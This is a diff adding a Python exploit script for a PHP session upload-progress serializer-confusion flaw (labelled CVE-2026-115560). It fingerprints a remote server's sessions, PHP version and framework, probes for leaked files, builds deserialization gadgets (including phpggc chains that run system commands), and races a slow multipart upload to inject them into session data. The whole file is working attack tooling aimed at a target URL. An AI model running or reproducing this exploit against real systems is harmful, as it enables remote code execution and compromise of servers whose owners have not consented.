@@ -1,0 +1,765 @@
+#!/usr/bin/env python3
+import argparse
+import json
+import os
+import re
+import shutil
+import socket
+import ssl
+import subprocess
+import sys
+import threading
+import time
+from urllib.parse import quote, urlparse
+
+BOUNDARY = "----pwnd"
+CHUNK_SIZE = 600
+DRIP_INTERVAL = 1.15
+HEAD_START = 8
+POLL_INTERVAL = 1
+PROGRESS_FIELD = "PHP_SESSION_UPLOAD_PROGRESS"
+PROGRESS_KEY = "upload_progress_"
+
+PROOF_PATTERN = re.compile(rb"SERIALIZED_(?:WAKEUP|DESTRUCT)")
+
+FP_PATHS = [
+    "/composer.json", "/vendor/composer/installed.json",
+    "/wp-login.php", "/wp-json/", "/artisan",
+    "/.git/HEAD", "/CHANGELOG.md", "/server-status",
+]
+
+FP_HEADERS = ["server", "x-powered-by", "x-generator", "x-frame-options"]
+
+FRAMEWORK_COOKIES = {
+    "PHPSESSID": "plain-php",
+    "laravel_session": "Laravel",
+    "symfony": "Symfony",
+    "sf_": "Symfony",
+    "wordpress_": "WordPress",
+    "wp-settings-": "WordPress",
+    "JSESSIONID": "Java",
+    "connect.sid": "Node",
+    "drupal": "Drupal",
+    "joomla": "Joomla",
+}
+
+REFLECTION_ENDPOINTS = [
+    "/me", "/api/user", "/profile", "/debug",
+    "/phpinfo.php", "/status", "/whoami", "/.well-known/me",
+]
+
+DEFAULT_SESSION_PATHS = [
+    "/var/lib/php/sessions/sess_{sid}",
+    "/var/lib/php/session/sess_{sid}",
+    "/tmp/sess_{sid}",
+]
+
+FIXED_VERSIONS = [(8, 2, 36), (8, 3, 37), (8, 4, 28), (8, 5, 13), (8, 6, 0)]
+
+
+def make_ssl_context():
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    return ctx
+
+
+def parse_url(url):
+    if "://" not in url:
+        url = "http://" + url
+    p = urlparse(url)
+    if not p.hostname:
+        raise ValueError(f"invalid URL: {url}")
+    port = p.port or (443 if p.scheme == "https" else 80)
+    path = p.path or "/"
+    if p.query:
+        path += "?" + p.query
+    return p.hostname, port, path
+
+
+def dechunk(data):
+    out = b""
+    while data:
+        line, sep, rem = data.partition(b"\r\n")
+        if not sep:
+            return data
+        try:
+            size = int(line.split(b";", 1)[0], 16)
+        except ValueError:
+            return data
+        if size == 0:
+            return out
+        if len(rem) < size + 2:
+            return data
+        out += rem[:size]
+        data = rem[size + 2:]
+    return out
+
+
+def http_request(url, method="GET", headers=None, body=b"", timeout=20,
+                 follow_redirects=0):
+    host, port, path = parse_url(url)
+    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}", "Connection: close"]
+    for k, v in (headers or {}).items():
+        lines.append(f"{k}: {v}")
+    if body:
+        lines.append(f"Content-Length: {len(body)}")
+    req = ("\r\n".join(lines) + "\r\n\r\n").encode() + body
+    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    raw.settimeout(timeout)
+    sock = make_ssl_context().wrap_socket(raw, server_hostname=host) if port == 443 else raw
+    try:
+        sock.connect((host, port))
+        sock.sendall(req)
+        resp = b""
+        while True:
+            chunk = sock.recv(65536)
+            if not chunk:
+                break
+            resp += chunk
+    finally:
+        sock.close()
+    head, _, rawbody = resp.partition(b"\r\n\r\n")
+    status = head.split(b"\r\n", 1)[0].decode(errors="replace") if head else ""
+    body_out = dechunk(rawbody)
+
+    if follow_redirects > 0 and "30" in status:
+        m = re.search(rb"(?i)location:\s*(\S+)", head)
+        if m:
+            loc = m.group(1).decode(errors="replace")
+            if loc.startswith("/"):
+                loc = f"{'https' if port == 443 else 'http'}://{host}{loc}"
+            return http_request(loc, headers=headers, timeout=timeout,
+                                follow_redirects=follow_redirects - 1)
+    return status, head, body_out
+
+
+def http_get(url, cookie=None):
+    headers = {"Cookie": cookie} if cookie else None
+    _, _, body = http_request(url, headers=headers)
+    return body
+
+
+def _parse_set_cookies(raw_headers):
+    out = []
+    for line in raw_headers.split(b"\r\n"):
+        m = re.match(rb"(?i)set-cookie:\s*([^=\s;]+)=([^;\s]*)", line)
+        if m:
+            out.append((m.group(1).decode(), m.group(2).decode()))
+    return out
+
+
+def discover_session(base_url, paths=None, probe_path="/login"):
+    paths = paths or ["/", "/index.php", "/login", "/profile"]
+    ev = {}
+
+    name = sid = None
+    for p in paths:
+        url = base_url.rstrip("/") + (p if p != "/" else "/")
+        try:
+            status, headers, _ = http_request(url, follow_redirects=2)
+        except OSError as exc:
+            ev[p] = f"request failed: {exc}"
+            continue
+        cookies = _parse_set_cookies(headers)
+        ev[p] = f"{status}; cookies={cookies!r}"
+        if cookies and name is None:
+            name, sid = cookies[0]
+    if not name:
+        return {"name": None, "sid": None, "accepts_supplied": None,
+                "honors_post_body": None, "rotates": None,
+                "evidence": ev, "fatal": "NO_SESSION"}
+
+    test_sid = "a" * 26
+    try:
+        _, headers, _ = http_request(base_url.rstrip("/") + "/",
+                                     headers={"Cookie": f"{name}={test_sid}"})
+        echoed = _parse_set_cookies(headers)
+        accepts = bool(echoed) and echoed[0][1] == test_sid
+        ev["strict_mode"] = f"echoed={echoed!r} accepts={accepts}"
+    except OSError as exc:
+        accepts = None
+        ev["strict_mode"] = f"failed: {exc}"
+
+    body = (
+        f"--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
+        f"{test_sid}\r\n"
+        f"--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="{PROGRESS_FIELD}"\r\n\r\n'
+        f"x\r\n"
+        f"--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="f"; filename="f"\r\n\r\n'
+        f"y\r\n--{BOUNDARY}--\r\n"
+    ).encode()
+    try:
+        _, headers, _ = http_request(
+            base_url.rstrip("/") + "/", method="POST",
+            headers={"Content-Type": f"multipart/form-data; boundary={BOUNDARY}"},
+            body=body)
+        echoed = _parse_set_cookies(headers)
+        honors_post = bool(echoed) and echoed[0][1] == test_sid
+        ev["only_cookies"] = f"echoed={echoed!r} honors={honors_post}"
+    except OSError as exc:
+        honors_post = None
+        ev["only_cookies"] = f"failed: {exc}"
+
+    rotates = None
+    try:
+        _, h1, _ = http_request(base_url.rstrip("/") + "/",
+                                headers={"Cookie": f"{name}={sid}"})
+        _, h2, _ = http_request(base_url.rstrip("/") + "/",
+                                headers={"Cookie": f"{name}={sid}"})
+        c1, c2 = _parse_set_cookies(h1), _parse_set_cookies(h2)
+        if c1 and c2:
+            rotates = c1[0][1] != c2[0][1]
+            ev["rotation"] = f"sids={c1[0][1]!r},{c2[0][1]!r} rotates={rotates}"
+    except OSError as exc:
+        ev["rotation"] = f"failed: {exc}"
+
+    try:
+        _, h1, _ = http_request(base_url.rstrip("/") + "/")
+        _, h2, _ = http_request(base_url.rstrip("/") + probe_path)
+        c1, c2 = _parse_set_cookies(h1), _parse_set_cookies(h2)
+        if c1 and c2:
+            ev["cross_endpoint"] = (f"{c1[0][1]!r} vs {c2[0][1]!r} "
+                                    f"rotates={c1[0][1] != c2[0][1]}")
+    except OSError as exc:
+        ev["cross_endpoint"] = f"failed: {exc}"
+
+    return {"name": name, "sid": sid, "accepts_supplied": accepts,
+            "honors_post_body": honors_post, "rotates": rotates,
+            "evidence": ev, "fatal": None}
+
+
+def probe_upload_progress(base_url, strategy):
+    for ep in REFLECTION_ENDPOINTS:
+        try:
+            status, _, body = http_request(base_url.rstrip("/") + ep, timeout=8)
+        except OSError:
+            continue
+        if "200" not in status or not body:
+            continue
+        if b"upload_progress" in body or PROGRESS_FIELD.encode() in body:
+            return {"upload_progress": "ENABLED", "evidence": f"reflection at {ep}"}
+        m = re.search(rb"session\.upload_progress\.enabled[^<\n]*?(On|Off)",
+                      body, re.I)
+        if m:
+            val = m.group(1).decode().lower()
+            return {"upload_progress": "ENABLED" if val == "on" else "DISABLED",
+                    "evidence": f"phpinfo at {ep}"}
+    return {"upload_progress": "UNKNOWN",
+            "reason": "no reflection endpoint; cannot confirm enabled"}
+
+
+def parse_php_version(headers):
+    text = headers.decode(errors="replace") if isinstance(headers, bytes) else headers
+    m = re.search(r"PHP/(\d+)\.(\d+)\.(\d+)", text, re.I)
+    if m:
+        return tuple(int(x) for x in m.groups())
+    return None
+
+
+def check_version(version):
+    if not version:
+        return None
+    return any(version >= fv for fv in FIXED_VERSIONS)
+
+
+def fingerprint_framework(base_url, session_name):
+    fw = None
+    for prefix, label in FRAMEWORK_COOKIES.items():
+        if session_name and (session_name == prefix
+                             or session_name.startswith(prefix)):
+            fw = label
+            break
+
+    leaks = []
+    headers_info = {}
+    for p in FP_PATHS:
+        try:
+            status, headers, body = http_request(base_url.rstrip("/") + p,
+                                                  timeout=8)
+        except OSError:
+            continue
+        if "200" in status and len(body) < 16384:
+            leaks.append({"path": p, "status": status,
+                          "snippet": body[:200].decode(errors="replace")})
+            if p == "/composer.json":
+                try:
+                    j = json.loads(body)
+                    if "require" in j:
+                        fw = fw or "composer"
+                        headers_info["composer_require"] = list(j["require"])[:20]
+                except Exception:
+                    pass
+            if p == "/artisan":
+                fw = fw or "Laravel"
+            if p == "/wp-login.php" or p == "/wp-json/":
+                fw = fw or "WordPress"
+
+    confidence = "low" if fw else "unknown"
+    if leaks:
+        confidence = "medium"
+    return {"framework": fw or "unknown",
+            "confidence": confidence, "leaks": leaks,
+            "headers": headers_info}
+
+
+def _phpggc_available():
+    return shutil.which("phpggc") is not None
+
+
+def _build_gadget_from_class(class_name):
+    if not re.fullmatch(r"[A-Za-z_\\][A-Za-z0-9_\\]*", class_name):
+        raise ValueError(f"invalid PHP class name: {class_name}")
+    return f'O:{len(class_name)}:"{class_name}":0:{{}}'.encode()
+
+
+def _build_gadget_from_chain(chain, cmd):
+    if not _phpggc_available():
+        raise RuntimeError("phpggc not available")
+    try:
+        out = subprocess.run(["phpggc", chain, "system", cmd],
+                             capture_output=True, timeout=30)
+    except (OSError, subprocess.TimeoutExpired) as exc:
+        raise RuntimeError(f"phpggc {chain} failed: {exc}")
+    if out.returncode != 0:
+        raise RuntimeError(f"phpggc {chain} rc={out.returncode}: "
+                           f"{out.stderr.decode(errors='replace')[:300]}")
+    return out.stdout
+
+
+def enumerate_gadgets(framework):
+    if not _phpggc_available():
+        return {"available": False,
+                "reason": "phpggc not in PATH; use --gadget or --gadget-class"}
+    try:
+        out = subprocess.run(["phpggc", "-l"], capture_output=True,
+                             text=True, timeout=20)
+    except (OSError, subprocess.TimeoutExpired) as exc:
+        return {"available": False, "reason": f"phpggc failed: {exc}"}
+    chains = [l.strip() for l in out.stdout.splitlines() if l.strip()]
+    return {"available": True, "chains": chains[:80]}
+
+
+def resolve_gadget(args, framework):
+    if args.gadget:
+        return {"gadget": args.gadget.encode(), "source": "override",
+                "status": "SUPPLIED"}
+    if args.gadget_chain:
+        try:
+            b = _build_gadget_from_chain(args.gadget_chain, args.gadget_cmd)
+            return {"gadget": b, "source": f"phpggc:{args.gadget_chain}",
+                    "status": "SUPPLIED"}
+        except RuntimeError as exc:
+            return {"gadget": None, "source": str(exc),
+                    "status": "BUILD_FAILED"}
+    if args.gadget_class:
+        try:
+            b = _build_gadget_from_class(args.gadget_class)
+            return {"gadget": b,
+                    "source": f"class:{args.gadget_class}",
+                    "status": "SUPPLIED"}
+        except ValueError as exc:
+            return {"gadget": None, "source": str(exc),
+                    "status": "BUILD_FAILED"}
+    enum = enumerate_gadgets(framework)
+    return {"gadget": None, "source": "phpggc-enum",
+            "status": "NO_GADGET" if not enum.get("available")
+                     else "AVAILABLE_UNCHOSEN",
+            "enum": enum}
+
+
+def detect_writer_serializer(base_url, strategy, gadget_bytes=None):
+    for ep in REFLECTION_ENDPOINTS:
+        try:
+            status, _, body = http_request(base_url.rstrip("/") + ep, timeout=6)
+        except OSError:
+            continue
+        if "200" not in status or not body:
+            continue
+        if body.startswith(b"a:") and b"{s:" in body:
+            return {"serializer": "php_serialize", "confidence": "high",
+                    "evidence": f"reflection at {ep}"}
+        if body and body[0] < 0x20 and len(body) > 1 and 0x20 <= body[1] < 0x7f:
+            return {"serializer": "php_binary", "confidence": "high",
+                    "evidence": f"reflection at {ep}"}
+        if b"|" in body and not body.startswith(b"a:"):
+            return {"serializer": "php", "confidence": "high",
+                    "evidence": f"reflection at {ep}"}
+    if gadget_bytes:
+        real = _post_probe(base_url, strategy, b"x|" + gadget_bytes)
+        fake = _post_probe(base_url, strategy,
+                           b'x|0:32:"RandomNonexistentClass1234567890":0:{}')
+        if real is not None and fake is not None and real != fake:
+            return {"serializer": "unknown", "confidence": "low",
+                    "evidence": "behavior differs real vs fake gadget"}
+    return {"serializer": "unknown", "confidence": "unknown",
+            "evidence": "no reflection; heuristic inconclusive"}
+
+
+def _post_probe(base_url, strategy, payload_bytes):
+    body = (
+        f"--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="{PROGRESS_FIELD}"\r\n\r\n'
+    ).encode() + payload_bytes + (
+        f"\r\n--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="f"; filename="f"\r\n\r\n'
+        f"y\r\n--{BOUNDARY}--\r\n"
+    ).encode()
+    headers = {"Content-Type": f"multipart/form-data; boundary={BOUNDARY}"}
+    if strategy.get("accepts_supplied") and strategy.get("name") and strategy.get("sid"):
+        headers["Cookie"] = f"{strategy['name']}={strategy['sid']}"
+    try:
+        _, _, body = http_request(base_url.rstrip("/") + "/", method="POST",
+                                  headers=headers, body=body, timeout=10)
+        return body
+    except OSError:
+        return None
+
+
+def _payload_for_writer(serializer, gadget_bytes):
+    if serializer == "php_binary":
+        return b"x|" + gadget_bytes
+    if serializer == "php_serialize":
+        return b"|" + gadget_bytes
+    return None
+
+
+def _build_multipart(progress_bytes, filename, field_name, strategy):
+    parts = []
+    if strategy.get("honors_post_body") and strategy.get("name") and strategy.get("sid"):
+        parts.append((
+            f"--{BOUNDARY}\r\n"
+            f'Content-Disposition: form-data; name="{strategy["name"]}"\r\n\r\n'
+            f"{strategy['sid']}\r\n"
+        ).encode())
+    parts.append((
+        f"--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="{PROGRESS_FIELD}"\r\n\r\n'
+    ).encode())
+    parts.append(progress_bytes)
+    parts.append((
+        f"\r\n--{BOUNDARY}\r\n"
+        f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
+        "\r\n"
+    ).encode())
+    return b"".join(parts)
+
+
+def slow_upload(host, port, path, duration, stop, progress_bytes,
+                filename, field_name, strategy, stats):
+    prefix = _build_multipart(progress_bytes, filename, field_name, strategy)
+    suffix = f"\r\n--{BOUNDARY}--\r\n".encode()
+    content_length = len(prefix) + CHUNK_SIZE * duration + len(suffix)
+    header_lines = [
+        f"POST {path} HTTP/1.1", f"Host: {host}",
+        f"Content-Type: multipart/form-data; boundary={BOUNDARY}",
+        f"Content-Length: {content_length}", "Connection: close",
+    ]
+    if not strategy.get("honors_post_body") and strategy.get("name") and strategy.get("sid"):
+        header_lines.insert(2, f"Cookie: {strategy['name']}={strategy['sid']}")
+    request = ("\r\n".join(header_lines) + "\r\n\r\n").encode()
+    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    raw.settimeout(10)
+    sock = make_ssl_context().wrap_socket(raw, server_hostname=host) if port == 443 else raw
+    stats["upload_start"] = time.time()
+    try:
+        sock.connect((host, port))
+        sock.sendall(request)
+        sock.sendall(prefix)
+        stats["producer_bytes"] = len(request) + len(prefix)
+        for i in range(duration):
+            if stop.is_set():
+                stats["upload_stopped"] = "proof captured"
+                return
+            try:
+                sock.sendall(b" " * CHUNK_SIZE)
+                stats["producer_bytes"] += CHUNK_SIZE
+            except OSError as exc:
+                stats["upload_error"] = str(exc)
+                return
+            if stop.wait(DRIP_INTERVAL):
+                stats["upload_stopped"] = "proof captured"
+                return
+        sock.sendall(suffix)
+        stats["upload_finished"] = time.time()
+    except OSError as exc:
+        stats["upload_error"] = str(exc)
+    finally:
+        sock.close()
+
+
+def race(target_url, strategy, serializer, gadget_bytes, duration,
+         control_url=None):
+    if not strategy.get("name") or not strategy.get("sid"):
+        return {"status": "SID_STRATEGY_MISMATCH",
+                "reason": "session name/sid not discovered"}
+    payload = _payload_for_writer(serializer, gadget_bytes)
+    if payload is None:
+        return {"status": "NOT_VULNERABLE",
+                "reason": f"writer serializer={serializer} (no mismatch possible)"}
+
+    stop_event = threading.Event()
+    proof_event = threading.Event()
+    stats = {}
+
+    host, port, path = parse_url(target_url)
+    t = threading.Thread(target=slow_upload,
+                         args=(host, port, path, duration, proof_event,
+                               payload, "f", "f", strategy, stats),
+                         daemon=True)
+    t.start()
+    time.sleep(HEAD_START)
+    hits = 0
+    first_proof = None
+    cookie = None
+    if strategy.get("name") and strategy.get("sid"):
+        cookie = f"{strategy['name']}={strategy['sid']}"
+    while t.is_alive() and not stop_event.is_set():
+        try:
+            body = http_get(target_url, cookie=cookie)
+            hits += 1
+            m = PROOF_PATTERN.search(body)
+            if m:
+                first_proof = m.group().decode()
+                proof_event.set()
+                stop_event.set()
+                break
+        except OSError:
+            pass
+        time.sleep(POLL_INTERVAL)
+    proof_event.set()
+    t.join(timeout=5)
+    stats["consumer_hits"] = hits
+    stats["first_proof"] = first_proof
+
+    if not first_proof:
+        return {"status": "NO_PROOF", "stats": stats}
+
+    if control_url:
+        control_strategy = discover_session(control_url)
+        if control_strategy.get("fatal") == "NO_SESSION":
+            return {"status": "DETECTOR_BROKEN",
+                    "reason": "control URL has no session — cannot validate detector",
+                    "stats": stats}
+        control_payload = _payload_for_writer(serializer, gadget_bytes)
+        control_fired = _control_check(control_url, control_strategy,
+                                       control_payload, duration)
+        if control_fired:
+            return {"status": "DETECTOR_BROKEN",
+                    "reason": "control URL also produced proof",
+                    "stats": stats}
+    return {"status": "SUCCESS", "proof": first_proof, "stats": stats}
+
+
+def _control_check(control_url, control_strategy, payload, duration):
+    if payload is None:
+        return False
+    stop_event = threading.Event()
+    proof_event = threading.Event()
+    stats = {}
+    host, port, path = parse_url(control_url)
+    t = threading.Thread(target=slow_upload,
+                         args=(host, port, path, duration, proof_event,
+                               payload, "f", "f", control_strategy, stats),
+                         daemon=True)
+    t.start()
+    time.sleep(HEAD_START)
+    fired = False
+    cookie = None
+    if control_strategy.get("name") and control_strategy.get("sid"):
+        cookie = f"{control_strategy['name']}={control_strategy['sid']}"
+    while t.is_alive() and not stop_event.is_set():
+        try:
+            body = http_get(control_url, cookie=cookie)
+            if PROOF_PATTERN.search(body):
+                fired = True
+                proof_event.set()
+                stop_event.set()
+                break
+        except OSError:
+            pass
+        time.sleep(POLL_INTERVAL)
+    proof_event.set()
+    t.join(timeout=5)
+    return fired
+
+
+def print_precondition_table(result):
+    rows = [
+        ("[1] session", f"name={result.get('session_name')!r} "
+                        f"honors_post={result.get('sid_strategy',{}).get('honors_post_body')} "
+                        f"rotates={result.get('sid_strategy',{}).get('rotates')}"),
+        ("[2] php version", f"{result.get('php_version')} "
+                            f"(patched={result.get('php_patched')})"),
+        ("[3] upload_progress", result.get("upload_progress", "UNKNOWN")),
+        ("[4] framework", f"{result.get('framework','unknown')} "
+                          f"(confidence={result.get('framework_confidence','unknown')})"),
+        ("[5] gadget", f"{result.get('gadget_status','NO_GADGET')} "
+                       f"({result.get('gadget_source')})"),
+        ("[6] writer", f"{result.get('writer_serializer','unknown')} "
+                       f"(confidence={result.get('writer_confidence','unknown')})"),
+        ("[7] race", result.get("race_status", "not-run")),
+    ]
+    print("\n Precondition status:")
+    for label, val in rows:
+        print(f"   {label}: {val}")
+
+
+def _emit(result, as_json):
+    if as_json:
+        print(json.dumps(result, indent=2, default=str))
+
+
+def main():
+    ap = argparse.ArgumentParser(
+        description="CVE-2026-115560 — PHP session upload progress "
+                    "serializer confusion (lab-first, no hardcode)")
+    ap.add_argument("--remote", required=True, help="target base URL")
+    ap.add_argument("--control-url", help="negative-control URL (must be clean)")
+    ap.add_argument("--paths", nargs="*", default=None,
+                    help="Stage 1 paths (default: /,/index.php,/login,/profile)")
+    ap.add_argument("--probe-path", default="/login",
+                    help="Stage 1 cross-endpoint rotation")
+    ap.add_argument("--gadget", help="serialized gadget bytes (override)")
+    ap.add_argument("--gadget-chain", help="phpggc chain name, e.g. Monolog/RCE1")
+    ap.add_argument("--gadget-cmd", default="id", help="cmd for phpggc chain")
+    ap.add_argument("--gadget-class", default="Gadget",
+                    help="PHP class name → O:<len>:\"Class\":0:{} (default: Gadget)")
+    ap.add_argument("--serializer", choices=["php", "php_binary",
+                                             "php_serialize", "unknown"],
+                    default=None, help="override writer serializer")
+    ap.add_argument("--duration", type=int, default=45)
+    ap.add_argument("--session-path", action="append", default=None,
+                    help="session file template ({sid}); repeatable")
+    ap.add_argument("--lfi-endpoint", default=None, help="LFI endpoint")
+    ap.add_argument("--lfi-param", default=None, help="LFI query param")
+    ap.add_argument("--force", action="store_true",
+                    help="chạy race dù precondition chưa chắc (upload_progress UNKNOWN)")
+    ap.add_argument("--json", action="store_true", help="emit structured JSON")
+    args = ap.parse_args()
+
+    result = {"target": args.remote, "control": args.control_url}
+
+    strategy = discover_session(args.remote, paths=args.paths,
+                                probe_path=args.probe_path)
+    result["session_name"] = strategy.get("name")
+    result["sid_strategy"] = {k: strategy.get(k) for k in
+                              ("name", "accepts_supplied", "honors_post_body", "rotates")}
+    result["sid_evidence"] = strategy.get("evidence")
+    if strategy.get("fatal") == "NO_SESSION":
+        result["failure_reason"] = "NO_SESSION: no Set-Cookie observed"
+        result["exit"] = 2
+        print_precondition_table(result)
+        _emit(result, args.json)
+        return 2
+
+    try:
+        _, headers, _ = http_request(args.remote, follow_redirects=1)
+    except OSError:
+        headers = b""
+    version = parse_php_version(headers)
+    result["php_version"] = ".".join(map(str, version)) if version else "unknown"
+    patched = check_version(version)
+    result["php_patched"] = patched
+    if patched is True:
+        result["failure_reason"] = (f"PHP {result['php_version']} >= fixed version; "
+                                    "CVE-2026-115560 patched")
+        result["exit"] = 2
+        print_precondition_table(result)
+        _emit(result, args.json)
+        return 2
+
+    up = probe_upload_progress(args.remote, strategy)
+    result["upload_progress"] = up["upload_progress"]
+    if up["upload_progress"] == "DISABLED":
+        result["failure_reason"] = "session.upload_progress.enabled=0"
+        result["exit"] = 2
+        print_precondition_table(result)
+        _emit(result, args.json)
+        return 2
+    if up["upload_progress"] == "UNKNOWN" and not args.force:
+        result["failure_reason"] = ("upload_progress UNKNOWN; "
+                                    "supply --force to attempt race anyway")
+        result["exit"] = 2
+        print_precondition_table(result)
+        _emit(result, args.json)
+        return 2
+
+    fp = fingerprint_framework(args.remote, strategy["name"])
+    result["framework"] = fp["framework"]
+    result["framework_confidence"] = fp["confidence"]
+    result["framework_leaks"] = fp["leaks"]
+
+    g = resolve_gadget(args, fp["framework"])
+    result["gadget_status"] = g["status"]
+    result["gadget_source"] = g["source"]
+    if "enum" in g:
+        result["gadget_enum"] = g["enum"]
+    gadget_bytes = g["gadget"]
+    if gadget_bytes is None:
+        result["failure_reason"] = (
+            "NO_GADGET: supply --gadget, --gadget-chain, or --gadget-class "
+            "(refusing to guess)")
+        result["exit"] = 2
+        print_precondition_table(result)
+        _emit(result, args.json)
+        return 2
+
+    ws = detect_writer_serializer(args.remote, strategy, gadget_bytes)
+    if args.serializer:
+        ws["serializer"] = args.serializer
+        ws["confidence"] = "override"
+    result["writer_serializer"] = ws["serializer"]
+    result["writer_confidence"] = ws["confidence"]
+    result["writer_evidence"] = ws["evidence"]
+    if ws["serializer"] == "unknown":
+        result["failure_reason"] = ("writer serializer unknown; supply "
+                                    "--serializer or a reflection endpoint")
+        result["exit"] = 2
+        print_precondition_table(result)
+        _emit(result, args.json)
+        return 2
+    if ws["serializer"] == "php":
+        result["failure_reason"] = ("writer serializer=php — no mismatch; "
+                                    "target not vulnerable")
+        result["exit"] = 2
+        print_precondition_table(result)
+        _emit(result, args.json)
+        return 2
+
+    result["race_serializer_used"] = ws["serializer"]
+    rr = race(args.remote, strategy, ws["serializer"], gadget_bytes,
+              args.duration, args.control_url)
+    result["race_status"] = rr["status"]
+    result["race_stats"] = rr.get("stats", {})
+    if rr["status"] == "SUCCESS":
+        result["success"] = True
+        result["proof"] = rr["proof"]
+        result["exit"] = 0
+    elif rr["status"] == "DETECTOR_BROKEN":
+        result["success"] = False
+        result["failure_reason"] = rr["reason"]
+        result["exit"] = 3
+    elif rr["status"] in ("NOT_VULNERABLE", "SID_STRATEGY_MISMATCH"):
+        result["success"] = False
+        result["failure_reason"] = rr["reason"]
+        result["exit"] = 2
+    else:
+        result["success"] = False
+        result["failure_reason"] = "race ran but no proof observed"
+        result["exit"] = 1
+
+    print_precondition_table(result)
+    if result.get("success"):
+        print(f"\n [+] Proof: {result['proof']}")
+    else:
+        print(f"\n [-] {result.get('failure_reason')}")
+    _emit(result, args.json)
+    return result["exit"]
+
+
+if __name__ == "__main__":
+    sys.exit(main())
